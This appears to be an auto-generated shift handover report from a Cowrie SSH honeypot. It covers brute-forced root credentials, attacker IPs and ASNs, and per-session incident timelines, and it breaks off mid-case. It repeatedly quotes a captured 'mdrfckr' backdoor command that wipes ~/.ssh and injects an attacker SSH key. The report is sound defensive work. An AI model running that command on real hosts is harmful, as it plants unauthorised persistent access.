# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-16 |
| **Generated At** | 2026-04-16T09:25:13Z |
| **Shift Time** | 09:25 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **127** |
| Confirmed Threats | **124** |
| False Positives Filtered | **3** (2.4%) |
| Unique Attacker IPs | **18** |
| Countries of Origin | **8** |
| High Severity Cases | **28** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **99** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **65** |
| Unique Credential Pairs | **29** |
| Unique Usernames | **13** |
| Unique Passwords | **29** |
| Successful Auth Pairs | **18** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 28 |
| `345gs5662d34` | 14 |
| `odoo` | 4 |
| `ubuntu` | 4 |
| `luis` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 14 |
| `3245gs5662d34` | 14 |
| `2021` | 2 |
| `luis` | 2 |
| `xxXX111` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 14 |
| `root` | `3245gs5662d34` | 14 |
| `ubuntu` | `2021` | 2 |
| `luis` | `luis` | 2 |
| `root` | `xxXX111` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Aa1234567890!` | `34.67.115.220` | 2026-04-16T07:02:54 |
| `root` | `3245gs5662d34` | `34.67.115.220` | 2026-04-16T07:03:00 |
| `root` | `A123456K` | `14.103.127.232` | 2026-04-16T07:03:57 |
| `root` | `3245gs5662d34` | `14.103.127.232` | 2026-04-16T07:04:01 |
| `root` | `xxXX111` | `72.79.42.117` | 2026-04-16T07:07:19 |
| `root` | `3245gs5662d34` | `72.79.42.117` | 2026-04-16T07:07:25 |
| `root` | `qazwsx888.` | `165.154.6.56` | 2026-04-16T07:09:09 |
| `root` | `3245gs5662d34` | `165.154.6.56` | 2026-04-16T07:09:12 |
| `root` | `Qwe@` | `165.154.6.56` | 2026-04-16T07:12:21 |
| `root` | `Aa123456!@#` | `165.154.6.56` | 2026-04-16T07:13:56 |
| `root` | `qazwsx888.` | `72.79.42.117` | 2026-04-16T07:15:27 |
| `root` | `qa2ws3ed#` | `165.154.6.56` | 2026-04-16T07:15:29 |
| `root` | `xxXX111` | `165.154.6.56` | 2026-04-16T07:25:24 |
| `root` | `Aa520250` | `165.154.6.56` | 2026-04-16T07:27:04 |
| `root` | `Root54321..` | `165.154.6.56` | 2026-04-16T07:30:17 |
| `root` | `12qw12qw` | `165.154.6.56` | 2026-04-16T07:31:58 |
| `root` | `Qazwsx2024@@` | `165.154.6.56` | 2026-04-16T07:35:12 |
| `root` | `qwe12345678` | `165.154.6.56` | 2026-04-16T07:38:38 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **127** |
| Sessions with Fingerprint | **3** |
| Unique HASSH Fingerprints | **3** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 72 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 69 | 8 |
| `04f9d9fca3a9...` | Modern SSH client | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 69 | 8 | Modern SSH client |
| `95420f9d932d...` | libssh | 2 | 2 | — |
| `04f9d9fca3a9...` | libssh | 1 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 14 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `34.67.115.220`, `72.79.42.117`, `165.154.6.56`, `14.103.127.232`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **18** |
| Unique ASNs | **14** |
| High-Risk ASNs | **12** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4811` | China Telecom (Group) | 4 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 2 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 1 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 1 | HIGH |
| `AS135089` | China Telecom | 1 | HIGH |
| `AS11260` | EastLink | 1 | HIGH |
| `AS3786` | LG DACOM Corporation | 1 | HIGH |
| `AS137047` | TELECOMMUNICATION AND TECHNOLOGY MASTERS (PVT.) LIMITED | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (28)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-0a0cbc6235dc

| Field | Detail |
|---|---|
| **Source IP** | `34.67.115[.]220` |
| **First Seen** | 2026-04-16 07:02 |
| **Last Seen** | 2026-04-16 07:03 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 07:02:53` | `cowrie.session.connect` |
| `2026-04-16 07:02:53` | `cowrie.client.version` |
| `2026-04-16 07:02:53` | `cowrie.client.kex` |
| `2026-04-16 07:02:54` | `cowrie.login.success` |
| `2026-04-16 07:02:55` | `cowrie.session.params` |
| `2026-04-16 07:02:55` | `cowrie.command.input` |
| `2026-04-16 07:02:55` | `cowrie.command.failed` |
| `2026-04-16 07:02:55` | `cowrie.log.closed` |
| `2026-04-16 07:02:56` | `cowrie.session.params` |
| `2026-04-16 07:02:56` | `cowrie.command.input` |
| `2026-04-16 07:02:56` | `cowrie.session.file_download` |
| `2026-04-16 07:02:56` | `cowrie.log.closed` |
| `2026-04-16 07:03:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.67.115[.]220` to AbuseIPDB if not already reported
- [ ] Block `34.67.115[.]220` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1dbfbceda8c6

| Field | Detail |
|---|---|
| **Source IP** | `34.67.115[.]220` |
| **First Seen** | 2026-04-16 07:02 |
| **Last Seen** | 2026-04-16 07:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 07:02:59` | `cowrie.session.connect` |
| `2026-04-16 07:02:59` | `cowrie.client.version` |
| `2026-04-16 07:02:59` | `cowrie.client.kex` |
| `2026-04-16 07:03:00` | `cowrie.login.success` |
| `2026-04-16 07:03:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.67.115[.]220` to AbuseIPDB if not already reported
- [ ] Block `34.67.115[.]220` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-887166d4828b

| Field | Detail |
|---|---|
| **Source IP** | `14.103.127[.]232` |
| **First Seen** | 2026-04-16 07:03 |
| **Last Seen** | 2026-04-16 07:04 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 07:03:56` | `cowrie.session.connect` |
| `2026-04-16 07:03:56` | `cowrie.client.version` |
| `2026-04-16 07:03:56` | `cowrie.client.kex` |
| `2026-04-16 07:03:57` | `cowrie.login.success` |
| `2026-04-16 07:03:57` | `cowrie.session.params` |
| `2026-04-16 07:03:57` | `cowrie.command.input` |
| `2026-04-16 07:03:57` | `cowrie.command.failed` |
| `2026-04-16 07:03:57` | `cowrie.log.closed` |
| `2026-04-16 07:03:58` | `cowrie.session.params` |
| `2026-04-16 07:03:58` | `cowrie.command.input` |
| `2026-04-16 07:03:58` | `cowrie.session.file_download` |
| `2026-04-16 07:03:58` | `cowrie.log.closed` |
| `2026-04-16 07:04:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.127[.]232` to AbuseIPDB if not already reported
- [ ] Block `14.103.127[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5709a3ed42d5

| Field | Detail |
|---|---|
| **Source IP** | `14.103.127[.]232` |
| **First Seen** | 2026-04-16 07:04 |
| **Last Seen** | 2026-04-16 07:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 07:04:00` | `cowrie.session.connect` |
| `2026-04-16 07:04:00` | `cowrie.client.version` |
| `2026-04-16 07:04:00` | `cowrie.client.kex` |
| `2026-04-16 07:04:01` | `cowrie.login.success` |
| `2026-04-16 07:04:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.127[.]232` to AbuseIPDB if not already reported
- [ ] Block `14.103.127[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c53d6ffe7ce2

| Field | Detail |
|---|---|
| **Source IP** | `72.79.42[.]117` |
| **First Seen** | 2026-04-16 07:07 |
| **Last Seen** | 2026-04-16 07:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 07:07:18` | `cowrie.session.connect` |
| `2026-04-16 07:07:18` | `cowrie.client.version` |
| `2026-04-16 07:07:18` | `cowrie.client.kex` |
| `2026-04-16 07:07:19` | `cowrie.login.success` |
| `2026-04-16 07:07:20` | `cowrie.session.params` |
| `2026-04-16 07:07:20` | `cowrie.command.input` |
| `2026-04-16 07:07:20` | `cowrie.command.failed` |
| `2026-04-16 07:07:20` | `cowrie.log.closed` |
| `2026-04-16 07:07:21` | `cowrie.session.params` |
| `2026-04-16 07:07:21` | `cowrie.command.input` |
| `2026-04-16 07:07:21` | `cowrie.session.file_download` |
| `2026-04-16 07:07:21` | `cowrie.log.closed` |
| `2026-04-16 07:07:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `72.79.42[.]117` to AbuseIPDB if not already reported
- [ ] Block `72.79.42[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aca27858b423

| Field | Detail |
|---|---|
| **Source IP** | `72.79.42[.]117` |
| **First Seen** | 2026-04-16 07:07 |
| **Last Seen** | 2026-04-16 07:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 07:07:24` | `cowrie.session.connect` |
| `2026-04-16 07:07:24` | `cowrie.client.version` |
| `2026-04-16 07:07:24` | `cowrie.client.kex` |
| `2026-04-16 07:07:25` | `cowrie.login.success` |
| `2026-04-16 07:07:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `72.79.42[.]117` to AbuseIPDB if not already reported
- [ ] Block `72.79.42[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70bb95ef8864

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]56` |
| **First Seen** | 2026-04-16 07:09 |
| **Last Seen** | 2026-04-16 07:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 07:09:09` | `cowrie.session.connect` |
| `2026-04-16 07:09:09` | `cowrie.client.version` |
| `2026-04-16 07:09:09` | `cowrie.client.kex` |
| `2026-04-16 07:09:09` | `cowrie.login.success` |
| `2026-04-16 07:09:09` | `cowrie.session.params` |
| `2026-04-16 07:09:09` | `cowrie.command.input` |
| `2026-04-16 07:09:09` | `cowrie.command.failed` |
| `2026-04-16 07:09:10` | `cowrie.log.closed` |
| `2026-04-16 07:09:10` | `cowrie.session.params` |
| `2026-04-16 07:09:10` | `cowrie.command.input` |
| `2026-04-16 07:09:10` | `cowrie.session.file_download` |
| `2026-04-16 07:09:10` | `cowrie.log.closed` |
| `2026-04-16 07:09:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]56` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d61604655bc6

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]56` |
| **First Seen** | 2026-04-16 07:09 |
| **Last Seen** | 2026-04-16 07:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 07:09:12` | `cowrie.session.connect` |
| `2026-04-16 07:09:12` | `cowrie.client.version` |
| `2026-04-16 07:09:12` | `cowrie.client.kex` |
| `2026-04-16 07:09:12` | `cowrie.login.success` |
| `2026-04-16 07:09:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]56` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6947b45df243

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]56` |
| **First Seen** | 2026-04-16 07:12 |
| **Last Seen** | 2026-04-16 07:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 07:12:20` | `cowrie.session.connect` |
| `2026-04-16 07:12:20` | `cowrie.client.version` |
| `2026-04-16 07:12:20` | `cowrie.client.kex` |
| `2026-04-16 07:12:21` | `cowrie.login.success` |
| `2026-04-16 07:12:21` | `cowrie.session.params` |
| `2026-04-16 07:12:21` | `cowrie.command.input` |
| `2026-04-16 07:12:21` | `cowrie.command.failed` |
| `2026-04-16 07:12:21` | `cowrie.log.closed` |
| `2026-04-16 07:12:21` | `cowrie.session.params` |
| `2026-04-16 07:12:21` | `cowrie.command.input` |
| `2026-04-16 07:12:21` | `cowrie.session.file_download` |
| `2026-04-16 07:12:21` | `cowrie.log.closed` |
| `2026-04-16 07:12:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]56` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f342f7ecba7b

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]56` |
| **First Seen** | 2026-04-16 07:12 |
| **Last Seen** | 2026-04-16 07:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 07:12:23` | `cowrie.session.connect` |
| `2026-04-16 07:12:23` | `cowrie.client.version` |
| `2026-04-16 07:12:23` | `cowrie.client.kex` |
| `2026-04-16 07:12:24` | `cowrie.login.success` |
| `2026-04-16 07:12:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]56` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbc00b08fe29

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]56` |
| **First Seen** | 2026-04-16 07:13 |
| **Last Seen** | 2026-04-16 07:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 07:13:55` | `cowrie.session.connect` |
| `2026-04-16 07:13:55` | `cowrie.client.version` |
| `2026-04-16 07:13:55` | `cowrie.client.kex` |
| `2026-04-16 07:13:56` | `cowrie.login.success` |
| `2026-04-16 07:13:56` | `cowrie.session.params` |
| `2026-04-16 07:13:56` | `cowrie.command.input` |
| `2026-04-16 07:13:56` | `cowrie.command.failed` |
| `2026-04-16 07:13:56` | `cowrie.log.closed` |
| `2026-04-16 07:13:57` | `cowrie.session.params` |
| `2026-04-16 07:13:57` | `cowrie.command.input` |
| `2026-04-16 07:13:57` | `cowrie.session.file_download` |
| `2026-04-16 07:13:57` | `cowrie.log.closed` |
| `2026-04-16 07:13:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]56` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d4778f66284

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]56` |
| **First Seen** | 2026-04-16 07:13 |
| **Last Seen** | 2026-04-16 07:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 07:13:59` | `cowrie.session.connect` |
| `2026-04-16 07:13:59` | `cowrie.client.version` |
| `2026-04-16 07:13:59` | `cowrie.client.kex` |
| `2026-04-16 07:13:59` | `cowrie.login.success` |
| `2026-04-16 07:13:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]56` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65008cf8eabe

| Field | Detail |
|---|---|
| **Source IP** | `72.79.42[.]117` |
| **First Seen** | 2026-04-16 07:15 |
| **Last Seen** | 2026-04-16 07:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 07:15:26` | `cowrie.session.connect` |
| `2026-04-16 07:15:26` | `cowrie.client.version` |
| `2026-04-16 07:15:26` | `cowrie.client.kex` |
| `2026-04-16 07:15:27` | `cowrie.login.success` |
| `2026-04-16 07:15:27` | `cowrie.session.params` |
| `2026-04-16 07:15:27` | `cowrie.command.input` |
| `2026-04-16 07:15:27` | `cowrie.command.failed` |
| `2026-04-16 07:15:28` | `cowrie.log.closed` |
| `2026-04-16 07:15:28` | `cowrie.session.params` |
| `2026-04-16 07:15:28` | `cowrie.command.input` |
| `2026-04-16 07:15:29` | `cowrie.session.file_download` |
